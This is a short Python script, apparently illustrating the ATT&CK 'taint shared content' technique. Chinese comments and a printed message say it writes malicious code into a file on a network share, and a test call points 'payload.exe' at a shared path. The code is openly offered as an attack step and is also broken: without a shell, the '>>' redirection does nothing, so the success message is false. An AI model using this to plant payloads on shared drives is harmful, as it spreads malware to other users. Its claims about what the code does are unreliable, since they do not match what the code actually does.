import subprocess

def t1080_exec(payload_path, target_path):
    # 使用命令將惡意程式碼寫入目標檔案
    subprocess.call(['echo', payload_path, '>>', target_path])

    print("惡意程式碼已寫入檔案:", target_path)

# 測試
t1080_exec('payload.exe', '\\\\network\\shared\\file.txt')